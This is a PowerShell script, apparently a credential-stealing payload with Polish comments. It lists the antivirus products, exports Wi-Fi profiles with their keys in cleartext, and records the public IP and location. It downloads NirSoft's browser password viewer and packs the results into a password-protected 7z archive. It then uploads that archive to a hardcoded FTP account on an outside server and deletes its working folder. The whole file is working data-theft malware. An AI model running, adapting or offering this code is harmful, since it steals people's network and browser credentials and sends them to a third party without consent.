$desktop = ([Environment]::GetFolderPath("Desktop"))


function GetVersion {
   mkdir \temp 
   cd \temp
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\Version.txt -Encoding utf8
}


function GetWifi {
   New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
   Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
   Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
   Copy-Item -Path "$desktop\0.txt" -Destination "C:\temp\Wifi.txt"
   Set-Location -Path "$env:temp"
   Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
}


function GetIP {
   $response = Invoke-WebRequest -Uri "http://ipinfo.io/json" | ConvertFrom-Json
   $ip = $response.ip
   $location = $response.city + ", " + $response.country
   $info = "IP: $ip`nLocation: $location"
   $info | Out-File -FilePath "C:\temp\IP.txt"
}


function GetNirsoft {
  cd \temp
  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip
}


function Create7z {
    $tempFolder = "C:\temp"
    if (-not (Test-Path $tempFolder)) {
        return
    }

    $filesToArchive = @(
        "C:\temp\Version.txt",
        "C:\temp\Wifi.txt",
        "C:\temp\IP.txt",
        "C:\temp\Pass.txt"
    )

    foreach ($file in $filesToArchive) {
        if (-not (Test-Path $file)) {
            return
        }
    }

    $zipPath = "$tempFolder\7z.zip"
    if (-not (Test-Path $zipPath)) {
        Write-Host "Pobieranie 7za920.zip..."
        Invoke-WebRequest -Uri "https://www.7-zip.org/a/7za920.zip" -OutFile $zipPath
    }

    $extractedFolder = "$tempFolder\7z"
    if (-not (Test-Path $extractedFolder)) {
        Write-Host "Rozpakowywanie 7za920.zip..."
        Expand-Archive -Path $zipPath -DestinationPath $extractedFolder
    }

    $sevenZipPath = "$extractedFolder\7za.exe"
    
    if (-not (Test-Path $sevenZipPath)) {
        return
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmm"
    $archivePath = "$tempFolder\tom$timestamp.7z"
    $pass = "1992"

    $arguments = @("a", "`"$archivePath`"", "-p$pass")
    foreach ($file in $filesToArchive) {
        $arguments += "`"$file`""
    }

    try {
        & $sevenZipPath $arguments
    }
    catch {
    }
}


function UploadFTP {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,

        [parameter(Position=1, Mandatory=$False)]
        [string]$ftpServer = "ftp://ftp.byethost33.com",

        [parameter(Position=2, Mandatory=$False)]
        [string]$ftpUser = "b33_37902659",

        [parameter(Position=3, Mandatory=$False)]
        [string]$ftpPass = $CodeFTP,

        [parameter(Position=4, Mandatory=$False)]
        [string]$ftpDir = "/htdocs/temp"
    )

    if (-not ([string]::IsNullOrEmpty($file))) {
        if (-not (Test-Path $file)) {
            return
        }
        try {
            $ftpUri = [System.Uri]::new($ftpServer + $ftpDir + "/" + [System.IO.Path]::GetFileName($file))

            $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
            $ftpRequest.Credentials = [System.Net.NetworkCredential]::new($ftpUser, $ftpPass)
            $ftpRequest.UseBinary = $true
            $ftpRequest.UsePassive = $true

            $fileBytes = [System.IO.File]::ReadAllBytes($file)

            $ftpStream = $ftpRequest.GetRequestStream()
            $ftpStream.Write($fileBytes, 0, $fileBytes.Length)
            $ftpStream.Close()
        }
        catch {
        }
    }
    else {
    }
}


function Up7z {
  $files = Get-ChildItem -Path "C:\temp" -Filter "tom*.7z"

  foreach ($file in $files) {
    try {
        # Sprawdzenie, czy plik istnieje przed próbą przesyłania
        if (Test-Path $file.FullName) {
            UploadFTP -file $file.FullName
            UploadFTP -file "C:\temp\TEST.7z"
        } else {
            Write-Host "Plik $($file.Name) nie istnieje, pomijam..."
        }
    }
    catch {
        Write-Host "Wystąpił błąd podczas próby przesyłania pliku: $($file.FullName)"
    }
}
}


function DelAll {
   cd C:\
   rmdir -R \temp

}


GetVersion
GetWifi
GetIP
GetNirsoft


